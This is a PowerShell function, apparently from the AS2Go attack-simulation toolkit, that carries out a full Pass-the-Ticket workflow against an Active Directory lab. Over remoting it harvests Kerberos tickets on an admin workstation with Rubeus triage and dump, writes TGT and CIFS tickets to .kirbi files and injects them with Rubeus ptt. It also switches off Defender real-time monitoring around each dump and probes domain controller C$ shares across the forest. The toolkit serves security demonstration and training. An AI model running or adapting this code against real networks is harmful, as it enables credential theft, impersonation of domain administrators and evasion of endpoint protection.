<#
.SYNOPSIS
Harvests and reuses Kerberos tickets on a single box in the AS2Go Pass-the-Ticket demonstration.

.DESCRIPTION
Uses the configured admin workstation as the single box and harvests tickets on it with Rubeus instead of Mimikatz.
Analyzes Rubeus triage output, summarizes available accounts, and recommends an account with a TGT and service ticket.
Allows another candidate, dumps its tickets with Rubeus as .kirbi files, and offers to inject them on the same box
or copy them to the local machine for injection on a separate machine.
Displays cached tickets and attempts to enumerate DC C$ shares across forest domains using the resulting context.

.EXAMPLE
Invoke-PassTheTicketAttackSingleBox
Runs this workflow using the loaded AS2Go module.

.INPUTS
None. This function does not declare pipeline input.

.OUTPUTS
Console messages and output from invoked commands; no dedicated result object is defined.

.NOTES
Private AS2Go function. Run from an initialized AS2Go module session.
Requires Rubeus.exe in the MaliciousTools folder on the local machine and on the single box, plus remoting access.
The workflow removes old .kirbi files in the AS2Go Temp\tickets folder on the single box before collecting tickets.

.COMPONENT
Category: Main Function

.FUNCTIONALITY
Harvests Kerberos tickets on the configured single box with Rubeus triage and dump instead of Mimikatz.
Reviews available ticket identities, injects a selected TGT on the same box or copies it
to the local machine, and inspects cached tickets after injection.
Inspects cached tickets and attempts to list domain controller admin shares across the forest.
#>
function Invoke-PassTheTicketAttackSingleBox {

    $Info = Measure-FunctionRuntime -Begin

    Show-CurrentPhase -Phase "ASP07_PtT.html"
    $Script:ASSAW = Get-ASConfig -Setting "AS2GoSAW"

    $TicketsToAbusePath = $Script:AS2GoTicketsDir
    # The single box mirrors the local AS2Go public folder layout, resolved remotely via $env:PUBLIC.
    $BoxTicketsPath = Join-Path -Path $Script:AS2GoPublicDir -ChildPath 'Temp\tickets'
    $RubeusExe = Join-Path -Path $Script:AS2GoPublicDir -ChildPath 'MaliciousTools\Rubeus.exe'

    If (-not $SkipClearHost) { Clear-Host }

    Write-AS2GoOutput -Type Header -Message "Pass-the-Ticket (PtT) Attack - Single Box"
    Write-AS2GoOutput -Type H1 -Message "This attack simulates a Pass-the-Ticket (PtT) attack that stays on one box, where stolen Kerberos tickets are used to impersonate a user. `nIn this case, we dump tickets from memory with Rubeus instead of Mimikatz and we will try to access the Domain Controller's c$ share. `nAll steps run on the single box '$Script:ASSAW'.`n"
    Write-AS2GoOutput -Type Bullet -Message "Step #1 - run Rubeus triage on the single box"
    Write-AS2GoOutput -Type Bullet -Message "Step #2 - dump tickets with Rubeus on the single box"
    Write-AS2GoOutput -Type Bullet -Message "Step #3 - run PtT to become a Tier 0 Admin"
    Write-Host ""

    If ($UnAttended) { Start-Sleep 2 } else {

        $Options = @(
            [pscustomobject] @{
                Label = "&Skip"
                Help  = "The single box is not ready. Skip the PtT simulation."
                Value = $Script:No
            }
        )

        if (-not $SafeMode) {
            $Options += [pscustomobject] @{
                Label = "&Yes"
                Help  = "All prerequisites are met. Proceed with the PtT simulation."
                Value = $Script:Yes
            }
        }

        $title = "Is the single box ($Script:ASSAW) ready for the Pass-the-Ticket (PtT) attack?"
        $message = "Please confirm that the following prerequisites are met:`n  • Rubeus.exe is present at $RubeusExe on the single box.`n  • Endpoint protection is disabled in the test environment."

        $decision = Show-DecisionPrompt -Message $message -Options $Options -Default ($Options.Count - 1) -Title $title

        If ($decision -eq $Script:No) {
            Write-AS2GoOutput -Type Quit -Message "Single box is not ready for the Pass-the-Ticket (PtT) attack."
            Measure-FunctionRuntime -End -Details $Info
            return
        }
    }

    If (-not $SkipClearHost) { Clear-Host }

    # remove all old tickets on the box and prepare the directory
    # $env:PUBLIC resolves on the single box, so both machines share the AS2Go folder layout.
    $BoxTicketsResolved = Invoke-Command -ComputerName $Script:ASSAW -ScriptBlock {
        $boxTickets = Join-Path -Path $env:PUBLIC -ChildPath 'AS2Go\Temp\tickets'
        Remove-Item -Path "$boxTickets\*.kirbi" -ErrorAction SilentlyContinue
        If (-not (Test-Path $boxTickets)) {
            New-Item -Path $boxTickets -ItemType Directory -Force | Out-Null
        }
        $boxTickets
    } -ErrorAction Stop

    ###############################################################################################################################

    Write-AS2GoOutput -Type Header -Message "Run Rubeus triage on the single box $Script:ASSAW"

    Write-AS2GoOutput -Type NextCommand -Message "Next Command: " -NoNewline
    $command = "Invoke-Command -ComputerName $Script:ASSAW -ScriptBlock { & '$RubeusExe' triage }"
    Write-AS2GoOutput -Type Command -NoExtraLines -Message $command

    If ($UnAttended) { Start-Sleep 2 } else { Pause }

    $triageText = Invoke-Command -ComputerName $Script:ASSAW -ScriptBlock {
        # $env:PUBLIC resolves on the single box, so both machines share the AS2Go folder layout.
        $boxRubeus = Join-Path -Path $env:PUBLIC -ChildPath 'AS2Go\MaliciousTools\Rubeus.exe'
        Set-MpPreference -DisableRealtimeMonitoring $true
        Try {
            & $boxRubeus triage 2>&1 | Out-String
        }
        Finally {
            Set-MpPreference -DisableRealtimeMonitoring $false
        }
    } -ErrorAction Stop

    # Parse triage output; supports the pipe table and the legacy block format.
    # Same user name can appear in several logon sessions; merge them so the
    # candidate menu shows one entry per user and the dump uses the best session.
    $owners = Get-RubeusTriageSessions -TriageOutput $triageText |
        Group-Object UserName |
        ForEach-Object {
            # Prefer sessions that offer both a TGT and a service ticket.
            $sessions = @($_.Group | Sort-Object @{ Expression = { [bool]$_.TGTSpn -and [bool]$_.ServiceSpn }; Descending = $true })
            $sessions[0]
        }

    If ($owners.Count -gt 0) {
        write-host "`n"
        Write-AS2GoOutput -Type Success -Message "Rubeus triage on the single box succeeded. `
       $($owners.Count) user logon sessions with Kerberos tickets were found on: $Script:ASSAW" -NoExtraLines
    }
    else {
        Write-AS2GoOutput -Type Error -Message "Rubeus triage on the single box failed. `
             No user logon sessions with Kerberos tickets were found on: `
             $Script:ASSAW"
        Measure-FunctionRuntime -End -Details $Info
        return
    }

    $owners | Format-Table LUID, UserName, TGTSpn, ServiceSpn -AutoSize | out-host

    $bestSingleBoxUser = $owners |
        Where-Object { $_.TGTSpn -and $_.ServiceSpn } |
        Select-Object -First 1

    $candidate = $bestSingleBoxUser.UserName
    If (-not $candidate) { $candidate = $owners[0].UserName }
    Write-AS2GoOutput -Type Textmaker -Message "Because both a TGT and a service ticket were present,`n      the primary Pass-the-Ticket candidate was identified as:" -TM $candidate

    $title = "Confirm or change the account whose tickets will be dumped"
    $message = ""

    If (-not $UnAttended) {
        $index = [array]::IndexOf($owners.UserName, $candidate)
        If ($index -lt 0) { $index = 0 }
        $options = @(
            foreach ($owner in $owners) {
                [pscustomobject] @{
                    Label = $owner.UserName
                    Help  = "LUID $($owner.LUID) - TGT: $(If ($owner.TGTSpn) { $owner.TGTSpn } else { 'none' }) - Service: $(If ($owner.ServiceSpn) { $owner.ServiceSpn } else { 'none' })"
                    Value = $owner.UserName
                }
            }
        )
        $options += [pscustomobject] @{
            Label = "&Skip"
            Help  = "Skip the Pass-the-Ticket single box simulation."
            Value = $Script:No
        }
        $selection = Show-DecisionPrompt -Options $options -Default $index -Title $title

        If ($selection -eq $Script:No) {
            Measure-FunctionRuntime -End -Details $Info
            return
        }
        $candidate = $selection
    }

    If (-not $SkipClearHost) { Clear-Host }

    ###############################################################################################################################

    Write-AS2GoOutput -Type Header -Message "Dump tickets with Rubeus on the single box $Script:ASSAW"

    $selectedOwner = $owners | Where-Object { $_.UserName -eq $candidate } | Select-Object -First 1

    Write-AS2GoOutput -Type NextCommand -Message "Next Command: " -NoNewline
    $command = "Invoke-Command -ComputerName $Script:ASSAW -ScriptBlock { & '$RubeusExe' dump /luid:$($selectedOwner.LUID) /service:krbtgt /nowrap }"
    Write-AS2GoOutput -Type Command -NoExtraLines -Message $command

    If ($UnAttended) { Start-Sleep 2 } else { Pause }

    $boxDumpOutput = Invoke-Command -ComputerName $Script:ASSAW -ScriptBlock {
        param($luid, $user)
        $boxTickets = Join-Path -Path $env:PUBLIC -ChildPath 'AS2Go\Temp\tickets'
        $boxRubeus = Join-Path -Path $env:PUBLIC -ChildPath 'AS2Go\MaliciousTools\Rubeus.exe'
        Set-MpPreference -DisableRealtimeMonitoring $true
        Try {
            Get-Item $boxRubeus -ErrorAction Stop | Out-Null
            # dump prints Base64 only; /outfile is not a valid dump switch, so each
            # ticket type is dumped with /nowrap and decoded into a .kirbi file here.
            $tgtBase64 = (& $boxRubeus dump /luid:$luid /service:krbtgt /nowrap | Out-String)
            $cifsBase64 = (& $boxRubeus dump /luid:$luid /service:cifs /nowrap | Out-String)

            $tgtBlob = [regex]::Match($tgtBase64, '[A-Za-z0-9+/=]{100,}').Value
            $cifsBlob = [regex]::Match($cifsBase64, '[A-Za-z0-9+/=]{100,}').Value

            If ($tgtBlob) {
                [IO.File]::WriteAllBytes("$boxTickets\$user-tgt.kirbi", [Convert]::FromBase64String($tgtBlob))
            }
            If ($cifsBlob) {
                [IO.File]::WriteAllBytes("$boxTickets\$user-cifs.kirbi", [Convert]::FromBase64String($cifsBlob))
            }

            # short status lines for the console, the blobs stay on the box
            "TGT saved: $(If ($tgtBlob) { "$user-tgt.kirbi" } else { 'no ticket found' })"
            "Service saved: $(If ($cifsBlob) { "$user-cifs.kirbi" } else { 'no ticket found' })"
        }
        Finally {
            Set-MpPreference -DisableRealtimeMonitoring $false
        }
    } -ArgumentList $selectedOwner.LUID, $candidate -ErrorAction Stop

    $boxDumpOutput | Out-Host

    $boxFiles = Invoke-Command -ComputerName $Script:ASSAW -ScriptBlock {
        Get-ChildItem -Path (Join-Path -Path $env:PUBLIC -ChildPath 'AS2Go\Temp\tickets') -Filter *.kirbi -ErrorAction SilentlyContinue |
            Select-Object Name, Length, LastWriteTime
    }

    If ($boxFiles) {
        write-host "`n"
        $boxFiles | Format-Table -AutoSize | out-host
        Write-AS2GoOutput -Type Success -Message "Rubeus dumped $($boxFiles.Count) 'kirbi' files for candidate '$candidate' on the single box." -NoExtraLines
        write-log INFO -Message "Rubeus dumped tickets for candidate '$candidate' on '$Script:ASSAW': $($boxFiles.Name -join ', ')"
    }
    else {
        Write-AS2GoOutput -Type Error -Message "Rubeus dump failed. No 'kirbi' files were found in: $BoxTicketsPath"
        Measure-FunctionRuntime -End -Details $Info
        return
    }

    If ($UnAttended) { Start-Sleep 2 } else { Pause }
    If (-not $SkipClearHost) { Clear-Host }

    ###############################################################################################################################

    Write-AS2GoOutput -Type Header -Message "Single box or separate machine?"

    $title = "Where should the tickets be used?"
    $message = "Single box: inject the dumped tickets directly on the box with Rubeus ptt. `nSeparate machine: copy the tickets to this machine and inject them here with the local Rubeus."

    $Options = @(
        [pscustomobject] @{
            Label = "Single &Box"
            Help  = "Inject directly on the single box with Rubeus ptt."
            Value = "Box"
        }
        [pscustomobject] @{
            Label = "Separate &Machine"
            Help  = "Copy the tickets to this machine and inject them here with the local Rubeus."
            Value = "Separate"
        }
        [pscustomobject] @{
            Label = "&Skip"
            Help  = "Skip the Pass-the-Ticket single box simulation."
            Value = $Script:No
        }
    )

    $decision = Show-DecisionPrompt -Message $message -Options $Options -Default 0 -Title $title

    If ($decision -eq $Script:No) {
        Measure-FunctionRuntime -End -Details $Info
        return
    }

    If (-not (Test-Path $TicketsToAbusePath)) {
        New-Item -Path $TicketsToAbusePath -ItemType Directory -Force | Out-Null
    }
    else {
        Remove-Item -Path "$TicketsToAbusePath\*.kirbi" -Force
    }

    If ($decision -eq "Separate") {
        # separate machine path: copy the dumped tickets from the box to the local machine and inject here
        Write-AS2GoOutput -Type Info -Message "Tickets are copied from '$Script:ASSAW' to the local machine."

        $session = New-PSSession -ComputerName $Script:ASSAW -ErrorAction Stop
        try {
            Copy-Item -FromSession $session -Path "$BoxTicketsResolved\*.kirbi" -Destination $TicketsToAbusePath -Force
        }
        finally {
            If ($null -ne $session) {
                Remove-PSSession -Session $session -ErrorAction SilentlyContinue
            }
        }

        $results = Get-Item "$TicketsToAbusePath\*.kirbi" -ErrorAction SilentlyContinue

        If ($results) {
            write-host "`n"
            $results | Format-Table Name
            Write-AS2GoOutput -Type Success -Message "$($results.Count) 'kirbi' files were copied to: $TicketsToAbusePath" -NoExtraLines
        }
        else {
            Write-AS2GoOutput -Type Error -Message "Copying tickets from $Script:ASSAW failed."
            Measure-FunctionRuntime -End -Details $Info
            return
        }

        If ($UnAttended) { Start-Sleep 2 } else { Pause }
        If (-not $SkipClearHost) { Clear-Host }

        Write-AS2GoOutput -Type Header -Message "load stolen tickets from candidate '$candidate'"
        Write-AS2GoOutput -Type NextCommand -Message "Next Command: " -NoNewline
        $command = 'Get-ChildItem "' + $TicketsToAbusePath + '\*.kirbi" | ForEach-Object { & "' + $RubeusExe + '" ptt /ticket:"$($_.FullName)" }'
        Write-AS2GoOutput -Type Command -NoExtraLines -Message $command

        If ($UnAttended) { Start-Sleep 2 } else { Pause }
        If (-not $SkipClearHost) { Clear-Host }

        # Rubeus ptt injects one .kirbi per call, so each file is passed separately.
        Get-ChildItem -Path "$TicketsToAbusePath\*.kirbi" -File | ForEach-Object {
            & $RubeusExe ptt /ticket:"$($_.FullName)"
        }

        Set-ASConfig -Setting "LastStage" -Value $Script:PtT
        Set-NewColorSchema -NewStage $Script:PtT

        Write-AS2GoOutput -Type Header -Message "Display currently cached Kerberos tickets"
        Write-AS2GoOutput -Type NextCommand -Message "Next Command: " -NoNewline
        $command = "klist"
        Write-AS2GoOutput -Type CodeSnippet -Message $command

        $tickets = Get-KlistTicket -Client $candidate
        $tickets | Format-Table TicketNumber, Client, Server, EncryptionType, EndTime -AutoSize
        Write-AS2GoOutput -Type textmaker -Message "Last Ticket for client" -tm $candidate
        $tickets | Select-Object -Last 1 | Format-List

        if ($tickets.Count -eq 0) {
            Write-AS2GoOutput -Type Error -Message "No Kerberos tickets found for client '$candidate'"
        }
        else {
            Write-AS2GoOutput -Type Success -Message "Kerberos tickets found for client '$candidate'"
        }

        If ($UnAttended) { Start-Sleep 2 } else { Pause }
        If (-not $SkipClearHost) { Clear-Host }

        Test-AccessToOneDCPerDomain

        If ($UnAttended) { Start-Sleep 2 } else { Pause }
    }
    else {
        # single box path: inject on the box and verify remotely
        Write-AS2GoOutput -Type Info -Message "Tickets stay on the single box for direct injection."

        Write-AS2GoOutput -Type NextCommand -Message "Next Command: " -NoNewline
        $boxPttCommand = "Invoke-Command -ComputerName $Script:ASSAW -ScriptBlock { & '$RubeusExe' ptt /ticket:'$BoxTicketsPath\*.kirbi' }"
        Write-AS2GoOutput -Type Command -NoExtraLines -Message $boxPttCommand

        If ($UnAttended) { Start-Sleep 2 } else { Pause }
        If (-not $SkipClearHost) { Clear-Host }

        $boxPttOutput = Invoke-Command -ComputerName $Script:ASSAW -ScriptBlock {
            # Rubeus ptt injects one .kirbi per call, so each file is passed separately.
            $boxTickets = Join-Path -Path $env:PUBLIC -ChildPath 'AS2Go\Temp\tickets'
            $boxRubeus = Join-Path -Path $env:PUBLIC -ChildPath 'AS2Go\MaliciousTools\Rubeus.exe'
            Get-ChildItem -Path "$boxTickets\*.kirbi" -File | ForEach-Object {
                & $boxRubeus ptt /ticket:"$($_.FullName)"
            }
        } -ErrorAction Stop
        $boxPttOutput | Out-Host

        Write-AS2GoOutput -Type Success -Message "Rubeus injected the tickets on the single box."

        $boxKlistOutput = Invoke-Command -ComputerName $Script:ASSAW -ScriptBlock {
            klist | Out-String
        } -ErrorAction SilentlyContinue
        Write-AS2GoOutput -Type Info -Message "klist output from the single box."
        $boxKlistOutput | Out-Host

        Set-ASConfig -Setting "LastStage" -Value $Script:PtT
        Set-NewColorSchema -NewStage $Script:PtT

        # the tickets are injected on the box, so the DC share check runs there too;
        # DCs are resolved locally and passed in to keep the remote block dependency-free
        Write-AS2GoOutput -Type Header -Message "Check DC C$ access from the single box"
        $domainDCs = Foreach ($domain in (Get-ADForest).domains) {
            Get-BestDomainController -Domain $domain
        }
        $boxAccess = Invoke-Command -ComputerName $Script:ASSAW -ScriptBlock {
            param($targets)
            $accessSucceeded = @()
            Foreach ($dc in $targets) {
                If (Get-ChildItem -Path "\\$dc\c$" -ErrorAction SilentlyContinue) {
                    $accessSucceeded += "\\$dc\c$"
                }
            }
            $accessSucceeded
        } -ArgumentList (, @($domainDCs)) -ErrorAction SilentlyContinue

        If ($boxAccess) {
            Write-AS2GoOutput -Type Success -Message "The single box accessed the DC C$ shares: $($boxAccess -join ', ')"
        }
        else {
            Write-AS2GoOutput -Type Bad -Message "The single box has no access to any domain controller's C$ share."
        }

        If ($UnAttended) { Start-Sleep 2 } else { Pause }
    }

    If ($UnAttended) { Start-Sleep 2 } else { Pause }

    Measure-FunctionRuntime -End -Details $Info
}
